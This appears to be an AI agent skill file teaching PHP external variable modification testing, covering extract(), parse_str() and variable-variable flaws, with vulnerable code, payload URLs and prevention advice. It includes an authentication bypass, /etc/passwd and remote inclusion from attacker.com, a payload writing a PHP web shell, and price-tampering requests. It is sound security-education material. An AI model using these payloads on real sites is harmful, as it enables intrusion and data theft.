---
name: external-variable
description: External variable modification and parameter tampering techniques. Use for input validation testing.
---

# External Variable Modification

## Description
External Variable Modification (also known as PHP Globals Overwrite or Variable Pollution) occurs when web applications improperly handle user input, allowing attackers to overwrite internal variables. This vulnerability is particularly relevant in PHP applications using functions like `extract()`, `import_request_variables()`, or when `register_globals` is enabled.

## Vulnerable Functions

### 1. extract()
Imports variables from an array into the current symbol table.

```php
// Vulnerable code
$authenticated = false;
extract($_GET);

if ($authenticated) {
    // Admin access
}
```

**Exploitation:**
```
http://target.com/page.php?authenticated=true
```

### 2. import_request_variables() (Deprecated)
```php
// Vulnerable code - PHP < 5.4
import_request_variables('GPC');
// Now all GET, POST, COOKIE vars are in global scope
```

### 3. parse_str()
```php
// Vulnerable code
$query = $_SERVER['QUERY_STRING'];
parse_str($query);
// Variables from query string now in scope
```

**Exploitation:**
```
http://target.com/page.php?admin=true&role=superuser
```

### 4. $$ Variable Variables
```php
// Vulnerable code
foreach ($_GET as $key => $value) {
    $$key = $value;
}
```

**Exploitation:**
```
http://target.com/page.php?authenticated=1&admin=1
```

## Attack Techniques

### 1. Authentication Bypass

**Vulnerable Code:**
```php
<?php
$authenticated = false;
$admin = false;

// Dangerous: allows overwriting variables
extract($_REQUEST);

if ($authenticated && $admin) {
    echo "Welcome Admin!";
    include("admin_panel.php");
}
?>
```

**Payload:**
```
http://target.com/page.php?authenticated=1&admin=1
```

### 2. File Inclusion via Variable Overwrite

**Vulnerable Code:**
```php
<?php
$page = "home.php";
extract($_GET);
include($page);
?>
```

**Payloads:**
```
# Local File Inclusion
http://target.com/page.php?page=/etc/passwd

# Remote File Inclusion (if allow_url_include=on)
http://target.com/page.php?page=http://attacker.com/shell.txt

# PHP Wrappers
http://target.com/page.php?page=php://filter/convert.base64-encode/resource=config.php
```

### 3. GLOBALS Array Overwrite

**Vulnerable Code:**
```php
<?php
$GLOBALS['admin'] = false;

foreach ($_GET as $key => $value) {
    $$key = $value;
}

if ($GLOBALS['admin']) {
    // Admin functions
}
?>
```

**Payload:**
```
http://target.com/page.php?GLOBALS[admin]=1
```

### 4. Session Variable Overwrite

**Vulnerable Code:**
```php
<?php
session_start();
$_SESSION['role'] = 'user';

extract($_GET);

if ($_SESSION['role'] == 'admin') {
    // Admin access
}
?>
```

**Payload:**
```
http://target.com/page.php?_SESSION[role]=admin
```

### 5. Object Property Overwrite

**Vulnerable Code:**
```php
<?php
class User {
    public $isAdmin = false;
}

$user = new User();
foreach ($_GET as $key => $value) {
    if (property_exists($user, $key)) {
        $user->$key = $value;
    }
}
?>
```

**Payload:**
```
http://target.com/page.php?isAdmin=true
```

### 6. Config Variable Overwrite

**Vulnerable Code:**
```php
<?php
$config = array(
    'debug' => false,
    'log_file' => '/var/log/app.log'
);

extract($_GET);

if ($config['debug']) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}

file_put_contents($config['log_file'], $log_data);
?>
```

**Payload:**
```
http://target.com/page.php?config[debug]=1&config[log_file]=/var/www/html/shell.php&log_data=<?php system($_GET['cmd']); ?>
```

## Detection Methods

### Code Review Patterns
```php
// Look for these patterns:
extract($
parse_str($
import_request_variables(
$$
foreach.*\$\$
register_globals
```

### Testing Methodology

1. **Identify variables in scope**
   - Review source code for variable declarations
   - Check for extract() or similar functions

2. **Test parameter pollution**
   ```
   ?var1=test&var2=test&_SESSION[user]=admin
   ```

3. **Test GLOBALS overwrite**
   ```
   ?GLOBALS[admin]=1
   ?GLOBALS[config][debug]=1
   ```

4. **Test array overwrite**
   ```
   ?config[key]=value
   ?settings[admin]=true
   ```

## Real-World Scenarios

### WordPress Plugin Vulnerability
```php
// Vulnerable plugin code
extract($_POST);
update_option('plugin_settings', $settings);
```

**Exploitation:**
```http
POST /wp-admin/admin-post.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=plugin_action&settings[admin_email]=attacker@evil.com
```

### E-commerce Price Manipulation
```php
// Vulnerable checkout code
extract($_POST);
$total = $price * $quantity;
process_payment($total);
```

**Exploitation:**
```http
POST /checkout HTTP/1.1
Content-Type: application/x-www-form-urlencoded

product_id=1&quantity=1&price=0.01
```

## Prevention

### 1. Use EXTR_SKIP Flag
```php
// Only imports variables that don't exist
extract($_GET, EXTR_SKIP);
```

### 2. Use EXTR_PREFIX_ALL
```php
// Prefixes all imported variables
extract($_GET, EXTR_PREFIX_ALL, 'user_');
// $_GET['name'] becomes $user_name
```

### 3. Whitelist Approach
```php
// Only extract specific variables
$allowed = ['name', 'email', 'message'];
$data = array_intersect_key($_GET, array_flip($allowed));
extract($data);
```

### 4. Avoid extract() Entirely
```php
// Instead of:
extract($_GET);
echo $name;

// Use:
echo htmlspecialchars($_GET['name'] ?? '');
```

### 5. Initialize Variables Before extract()
```php
// Set defaults before extract
$authenticated = false;
$admin = false;
$role = 'user';

// extract() cannot overwrite because EXTR_SKIP
extract($_GET, EXTR_SKIP);
```

### 6. Type Checking
```php
// Validate types after extraction
extract($_GET, EXTR_SKIP);
$admin = filter_var($admin ?? false, FILTER_VALIDATE_BOOLEAN);
```

## Related CWEs

- CWE-473: PHP External Variable Modification
- CWE-621: Variable Extraction Error
- CWE-914: Improper Control of Dynamically-Identified Variables

## Testing Checklist

- [ ] Search for `extract()` in source code
- [ ] Search for `parse_str()` usage
- [ ] Check for `$$` variable variables
- [ ] Test GLOBALS array injection
- [ ] Test _SESSION array injection
- [ ] Test config/settings array injection
- [ ] Check for authentication bypass
- [ ] Test for file inclusion via variable overwrite

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/External%20Variable%20Modification
- https://www.php.net/manual/en/function.extract.php
- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
